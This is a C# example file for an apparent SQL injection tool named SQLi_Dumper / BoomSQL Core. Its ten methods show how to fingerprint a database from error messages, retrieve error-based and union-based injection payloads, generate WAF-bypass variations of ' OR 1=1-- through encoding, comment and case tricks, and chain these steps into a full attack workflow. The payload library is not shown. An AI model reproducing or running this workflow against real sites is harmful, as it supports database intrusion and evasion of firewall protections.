using System;
using System.Collections.Generic;
using System.Linq;
using DataBase;
using SQLi_Dumper.Core;

namespace SQLi_Dumper.Core
{
    /// <summary>
    /// Example usage of enhanced BoomSQL Core functionality
    /// This class demonstrates how to use the new features
    /// </summary>
    public static class UsageExamples
    {
        /// <summary>
        /// Example 1: Basic database detection from error response
        /// </summary>
        public static void ExampleDatabaseDetection()
        {
            // Sample error response from MySQL
            string mysqlError = "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version";
            
            // Detect database from error
            var detectedType = CoreIntegration.DetectDatabaseFromResponse(mysqlError);
            Console.WriteLine($"Detected database: {detectedType}");
            
            // Get detailed error signatures
            var signatures = ErrorSignatures.DetectDatabaseFromError(mysqlError);
            foreach (var sig in signatures)
            {
                Console.WriteLine($"Database: {sig.Database}, Error Type: {sig.ErrorType}, Description: {sig.Description}");
            }
        }

        /// <summary>
        /// Example 2: Get payloads for specific database and category
        /// </summary>
        public static void ExamplePayloadGeneration()
        {
            // Get error-based payloads for MySQL
            var mysqlErrorPayloads = Payloads.GetPayloads(
                Payloads.PayloadCategory.Error_Based, 
                DbTypes.DatabaseFamily.MySQL
            );
            
            Console.WriteLine($"Found {mysqlErrorPayloads.Count} MySQL error-based payloads:");
            foreach (var payload in mysqlErrorPayloads.Take(5))
            {
                Console.WriteLine($"- {payload.Name}: {payload.PayloadString}");
            }
            
            // Get union-based payloads for all databases
            var unionPayloads = Payloads.GetPayloadsByCategory(Payloads.PayloadCategory.Union_Based);
            Console.WriteLine($"\nFound {unionPayloads.Count} union-based payloads across all databases");
        }

        /// <summary>
        /// Example 3: Apply WAF bypass techniques
        /// </summary>
        public static void ExampleWAFBypass()
        {
            string originalPayload = "' OR 1=1--";
            
            // Generate WAF bypass variations
            var variations = WAFBypass.GenerateBypassVariations(
                originalPayload, 
                DbTypes.DatabaseFamily.MySQL, 
                10
            );
            
            Console.WriteLine($"Generated {variations.Count} WAF bypass variations:");
            foreach (var variation in variations)
            {
                Console.WriteLine($"- {variation}");
            }
            
            // Apply specific bypass techniques
            var techniques = new List<WAFBypass.BypassCategory>
            {
                WAFBypass.BypassCategory.Encoding,
                WAFBypass.BypassCategory.Comments,
                WAFBypass.BypassCategory.CaseManipulation
            };
            
            var bypassed = WAFBypass.ApplyBypassTechniques(originalPayload, techniques, DbTypes.DatabaseFamily.MySQL);
            Console.WriteLine($"\nApplied specific techniques, got {bypassed.Count} variations");
        }

        /// <summary>
        /// Example 4: Enhanced analyzer usage
        /// </summary>
        public static void ExampleAnalyzerEnhancement()
        {
            // Note: This example shows how the analyzer would be enhanced
            // In practice, you would use an actual URL and analyzer instance
            
            string testUrl = "http://example.com/test.php?id=1";
            
            // Create analyzer (this would be your existing analyzer)
            // var analyzer = new Analyzer(testUrl, dumperMode);
            
            // Example of enhanced functionality (pseudo-code)
            Console.WriteLine("Example enhanced analyzer usage:");
            
            // Get enhanced payloads for current database type
            var errorPayloads = CoreIntegration.GetErrorBasedPayloads(Types.MySQL_Unknown);
            Console.WriteLine($"Got {errorPayloads.Count} error-based payloads for MySQL");
            
            // Apply WAF bypass to a payload
            var bypassed = CoreIntegration.ApplyWAFBypass("' OR 1=1--", Types.MySQL_Unknown);
            Console.WriteLine($"Applied WAF bypass, got {bypassed.Count} variations");
            
            // Check method support
            bool supportsTime = CoreIntegration.SupportsDetectionMethod(Types.MySQL_Unknown, DetectionMethods.DetectionType.Time_Based);
            Console.WriteLine($"MySQL supports time-based detection: {supportsTime}");
        }

        /// <summary>
        /// Example 5: Detection method configuration
        /// </summary>
        public static void ExampleDetectionMethods()
        {
            // Get available detection methods for MySQL
            var methods = DetectionMethods.GetMethodsForDatabase(DbTypes.DatabaseFamily.MySQL);
            
            Console.WriteLine($"Available detection methods for MySQL ({methods.Count}):");
            foreach (var method in methods)
            {
                Console.WriteLine($"- {method.Name} (Priority: {method.Priority})");
                Console.WriteLine($"  Description: {method.Description}");
                Console.WriteLine($"  Test payloads: {method.TestPayloads.Length}");
            }
        }

        /// <summary>
        /// Example 6: Custom payload and signature management
        /// </summary>
        public static void ExampleCustomization()
        {
            // Add custom payload
            var customPayload = new Payloads.Payload
            {
                Name = "Custom MySQL Test",
                Category = Payloads.PayloadCategory.Error_Based,
                Description = "Custom payload for demonstration",
                PayloadString = "' AND custom_function()--",
                SupportedDatabases = new[] { DbTypes.DatabaseFamily.MySQL },
                RiskLevel = 2,
                ExpectedResult = "Custom error message"
            };
            
            Payloads.AddCustomPayload(customPayload);
            Console.WriteLine("Added custom payload");
            
            // Add custom error signature
            var customSignature = new ErrorSignatures.ErrorSignature(
                @"Custom database error pattern",
                DbTypes.DatabaseFamily.MySQL,
                "Custom Error",
                System.Text.RegularExpressions.RegexOptions.IgnoreCase,
                "Custom error signature for demonstration"
            );
            
            ErrorSignatures.AddCustomErrorSignature(customSignature);
            Console.WriteLine("Added custom error signature");
        }

        /// <summary>
        /// Example 7: Get comprehensive statistics
        /// </summary>
        public static void ExampleStatistics()
        {
            // Get Core module statistics
            var stats = CoreIntegration.GetCoreStatistics();
            
            Console.WriteLine("BoomSQL Core Statistics:");
            foreach (var stat in stats)
            {
                Console.WriteLine($"- {stat.Key}: {stat.Value}");
            }
            
            // Get payload statistics by category
            var payloadStats = Payloads.GetPayloadStatistics();
            Console.WriteLine("\nPayload Statistics by Category:");
            foreach (var stat in payloadStats)
            {
                Console.WriteLine($"- {stat.Key}: {stat.Value} payloads");
            }
            
            // Get database support information
            var databases = Enum.GetValues(typeof(DbTypes.DatabaseFamily))
                               .Cast<DbTypes.DatabaseFamily>()
                               .Where(db => db != DbTypes.DatabaseFamily.Unknown)
                               .ToList();
            
            Console.WriteLine($"\nSupported Databases ({databases.Count}):");
            foreach (var db in databases)
            {
                var payloadCount = Payloads.GetPayloadsForDatabase(db).Count;
                var signatureCount = ErrorSignatures.GetErrorSignaturesForDatabase(db).Count;
                Console.WriteLine($"- {db}: {payloadCount} payloads, {signatureCount} signatures");
            }
        }

        /// <summary>
        /// Example 8: Database-specific feature checking
        /// </summary>
        public static void ExampleDatabaseFeatures()
        {
            var databases = new[] { Types.MySQL_Unknown, Types.MSSQL_Unknown, Types.Oracle_Unknown, Types.PostgreSQL_Unknown };
            
            Console.WriteLine("Database Feature Support:");
            foreach (var db in databases)
            {
                Console.WriteLine($"\n{CoreIntegration.GetFriendlyName(db)}:");
                Console.WriteLine($"  - Error-based: {CoreIntegration.SupportsDetectionMethod(db, DetectionMethods.DetectionType.Error_Based)}");
                Console.WriteLine($"  - Union-based: {CoreIntegration.SupportsDetectionMethod(db, DetectionMethods.DetectionType.Union_Based)}");
                Console.WriteLine($"  - Time-based: {CoreIntegration.SupportsDetectionMethod(db, DetectionMethods.DetectionType.Time_Based)}");
                Console.WriteLine($"  - Stacked queries: {CoreIntegration.SupportsDetectionMethod(db, DetectionMethods.DetectionType.Stacked_Queries)}");
                Console.WriteLine($"  - Out-of-band: {CoreIntegration.SupportsDetectionMethod(db, DetectionMethods.DetectionType.Out_Of_Band)}");
                
                var payloadCount = CoreIntegration.GetAllPayloads(db).Count;
                var signatureCount = CoreIntegration.GetErrorSignatures(db).Count;
                Console.WriteLine($"  - Payloads: {payloadCount}");
                Console.WriteLine($"  - Error signatures: {signatureCount}");
            }
        }

        /// <summary>
        /// Example 9: WAF bypass technique demonstration
        /// </summary>
        public static void ExampleWAFBypassTechniques()
        {
            string testPayload = "SELECT * FROM users WHERE id = 1";
            
            Console.WriteLine("WAF Bypass Technique Examples:");
            
            // Get all bypass techniques
            var techniques = WAFBypass.BypassTechniques;
            
            foreach (var category in Enum.GetValues(typeof(WAFBypass.BypassCategory)).Cast<WAFBypass.BypassCategory>())
            {
                var categoryTechniques = techniques.Where(t => t.Category == category).ToList();
                if (categoryTechniques.Count > 0)
                {
                    Console.WriteLine($"\n{category} ({categoryTechniques.Count} techniques):");
                    foreach (var technique in categoryTechniques.Take(2)) // Show first 2 techniques per category
                    {
                        Console.WriteLine($"  - {technique.Name}: {technique.Description}");
                        if (technique.ExamplePayloads.Length > 0)
                        {
                            Console.WriteLine($"    Example: {technique.ExamplePayloads[0]}");
                        }
                    }
                }
            }
        }

        /// <summary>
        /// Example 10: Complete workflow demonstration
        /// </summary>
        public static void ExampleCompleteWorkflow()
        {
            Console.WriteLine("=== Complete BoomSQL Core Workflow ===\n");
            
            // Step 1: Initialize Core modules
            CoreIntegration.Initialize();
            Console.WriteLine("1. Core modules initialized");
            
            // Step 2: Simulate error response analysis
            string errorResponse = "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version";
            var detectedType = CoreIntegration.DetectDatabaseFromResponse(errorResponse);
            Console.WriteLine($"2. Detected database: {detectedType}");
            
            // Step 3: Get appropriate payloads
            var payloads = CoreIntegration.GetErrorBasedPayloads(detectedType);
            Console.WriteLine($"3. Retrieved {payloads.Count} error-based payloads");
            
            // Step 4: Apply WAF bypass techniques
            var originalPayload = payloads.FirstOrDefault() ?? "' OR 1=1--";
            var bypassed = CoreIntegration.ApplyWAFBypass(originalPayload, detectedType, 5);
            Console.WriteLine($"4. Generated {bypassed.Count} WAF bypass variations");
            
            // Step 5: Check supported detection methods
            var methods = CoreIntegration.GetDetectionMethods(detectedType);
            Console.WriteLine($"5. Found {methods.Count} applicable detection methods");
            
            // Step 6: Get comprehensive statistics
            var stats = CoreIntegration.GetCoreStatistics();
            Console.WriteLine($"6. Core statistics: {stats.Count} modules loaded");
            
            Console.WriteLine("\n=== Workflow Complete ===");
        }

        /// <summary>
        /// Run all examples
        /// </summary>
        public static void RunAllExamples()
        {
            Console.WriteLine("BoomSQL Core Enhancement - Usage Examples\n");
            
            try
            {
                ExampleDatabaseDetection();
                Console.WriteLine("\n" + new string('-', 50) + "\n");
                
                ExamplePayloadGeneration();
                Console.WriteLine("\n" + new string('-', 50) + "\n");
                
                ExampleWAFBypass();
                Console.WriteLine("\n" + new string('-', 50) + "\n");
                
                ExampleAnalyzerEnhancement();
                Console.WriteLine("\n" + new string('-', 50) + "\n");
                
                ExampleDetectionMethods();
                Console.WriteLine("\n" + new string('-', 50) + "\n");
                
                ExampleCustomization();
                Console.WriteLine("\n" + new string('-', 50) + "\n");
                
                ExampleStatistics();
                Console.WriteLine("\n" + new string('-', 50) + "\n");
                
                ExampleDatabaseFeatures();
                Console.WriteLine("\n" + new string('-', 50) + "\n");
                
                ExampleWAFBypassTechniques();
                Console.WriteLine("\n" + new string('-', 50) + "\n");
                
                ExampleCompleteWorkflow();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error running examples: {ex.Message}");
            }
        }
    }
}